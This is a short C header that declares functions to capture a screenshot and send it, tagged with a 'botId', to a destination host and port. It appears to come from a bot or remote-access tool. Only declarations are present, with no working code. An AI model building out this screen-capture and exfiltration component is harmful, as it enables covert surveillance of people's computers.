#ifndef SCREENSHOT_H
#define SCREENSHOT_H

char* CaptureScreenshot(int* length);
bool SendScreenshot(char* destination, unsigned short port, char* data, int dataLength, char* botId);
void FreeScreenshot(char*);

#endif